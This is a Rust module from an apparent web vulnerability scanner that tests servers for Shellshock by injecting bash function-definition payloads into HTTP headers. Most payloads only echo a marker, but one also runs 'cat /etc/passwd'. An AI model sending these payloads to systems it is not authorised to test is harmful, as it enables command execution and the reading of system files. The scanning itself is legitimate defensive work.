//! Shellshock Vulnerability Detection
//! Detects Shellshock (CVE-2014-6271) by injecting malicious environment variables into HTTP headers.
//! Uses non-destructive payloads that only echo a unique marker string.

use crate::checks::Check;
use crate::findings::Finding;
use crate::http::{Request, Response};
use std::collections::HashMap;

/// Unique marker for Shellshock detection (non-destructive)
const SHELLSHOCK_MARKER: &str = "XSSHELLO";

/// Maximum number of header variants to test (bounded)
const MAX_HEADER_VARIANTS: usize = 20;

/// Headers commonly passed to CGI/bash environments
const TARGET_HEADERS: &[&str] = &[
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "Cookie",
    "Accept",
    "Accept-Language",
    "Accept-Encoding",
    "X-Custom-Header",
];

/// Shellshock payload variants
const SHELLSHOCK_PAYLOADS: &[&str] = &[
    // Original CVE-2014-6271
    "() { :;}; /bin/echo {}",
    // CVE-2014-7169 variant
    "() { _='() { :; }'; _;} /bin/echo {}",
    // CVE-2014-7186 variant  
    "x () { (a)=>'\\' /bin/echo {}; cat /etc/passwd'",
    // Simple echo variant
    "() { :;}; echo {}",
    // With function name
    "shellshock() { :;}; echo {}",
];

pub struct ShellshockCheck {
    payloads: Vec<String>,
}

impl ShellshockCheck {
    pub fn new() -> Self {
        let mut payloads = Vec::with_capacity(MAX_HEADER_VARIANTS);
        
        for payload_template in SHELLSHOCK_PAYLOADS.iter() {
            let payload = payload_template.replace("{}", SHELLSHOCK_MARKER);
            payloads.push(payload);
            
            // URL-encoded variant
            let encoded = urlencoding_encode(&payload);
            if payloads.len() < MAX_HEADER_VARIANTS {
                payloads.push(encoded);
            }
        }
        
        Self { payloads }
    }
    
    /// Test a specific header for Shellshock vulnerability
    fn test_header(&self, req: &Request, header_name: &str) -> Option<Finding> {
        for payload in self.payloads.iter() {
            let mut test_req = req.clone();
            test_req.set_header(header_name, payload);
            
            match test_req.send_with_timeout(5000) {
                Ok(response) => {
                    if self.detect_shellshock_response(&response) {
                        return Some(Finding::new(
                            "SHELLSHOCK_CVE_2014_6271",
                            &format!(
                                "Server is vulnerable to Shellshock via '{}' header",
                                header_name
                            ),
                            response.url(),
                            10, // Critical severity
                        )
                        .with_payload(payload)
                        .with_evidence(&format!(
                            "Marker '{}' found in response indicating command execution",
                            SHELLSHOCK_MARKER
                        ))
                        .with_remediation(
                            "Update bash to version 4.3+ or apply vendor patches. \
                             Disable CGI if not needed. Use mod_security rules."
                        ));
                    }
                }
                Err(_) => continue,
            }
        }
        None
    }
    
    /// Detect Shellshock exploitation in response
    fn detect_shellshock_response(&self, response: &Response) -> bool {
        let body = response.body_slice();
        let headers = response.headers();
        
        // Check body for marker
        if body.contains(SHELLSHOCK_MARKER.as_bytes()) {
            return true;
        }
        
        // Check headers for marker reflection
        for (_, value) in headers {
            if value.contains(SHELLSHOCK_MARKER) {
                return true;
            }
        }
        
        // Check for error patterns indicating bash execution attempt
        let error_patterns = [
            b"bash:",
            b"segmentation fault",
            b"core dumped",
            b"syntax error",
        ];
        
        for pattern in error_patterns.iter() {
            if body.contains(pattern) {
                return true;
            }
        }
        
        false
    }
}

impl Check for ShellshockCheck {
    fn name(&self) -> &'static str {
        "Shellshock"
    }
    
    fn run(&self, request: &Request) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        // Test each target header
        for header in TARGET_HEADERS.iter() {
            if let Some(finding) = self.test_header(request, header) {
                findings.push(finding);
                break; // One finding per vulnerability type
            }
        }
        
        findings
    }
    
    fn metadata(&self) -> HashMap<&'static str, &'static str> {
        let mut meta = HashMap::new();
        meta.insert("type", "shellshock");
        meta.insert("severity", "critical");
        meta.insert("cve", "CVE-2014-6271,CVE-2014-7169,CVE-2014-7186");
        meta.insert("cwe", "CWE-78");
        meta.insert("cvss", "10.0");
        meta
    }
}

/// Simple URL encoding helper (zero-copy where possible)
fn urlencoding_encode(input: &str) -> String {
    let mut encoded = String::with_capacity(input.len() * 2);
    for c in input.chars() {
        match c {
            'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => {
                encoded.push(c);
            }
            ' ' => encoded.push_str("%20"),
            _ => {
                for byte in c.to_string().as_bytes() {
                    encoded.push_str(&format!("%{:02X}", byte));
                }
            }
        }
    }
    encoded
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_payload_generation() {
        let check = ShellshockCheck::new();
        assert!(check.payloads.len() <= MAX_HEADER_VARIANTS * 2);
        assert!(check.payloads.iter().any(|p| p.contains(SHELLSHOCK_MARKER)));
    }
    
    #[test]
    fn test_url_encoding() {
        let encoded = urlencoding_encode("hello world!");
        assert_eq!(encoded, "hello%20world%21");
    }
}
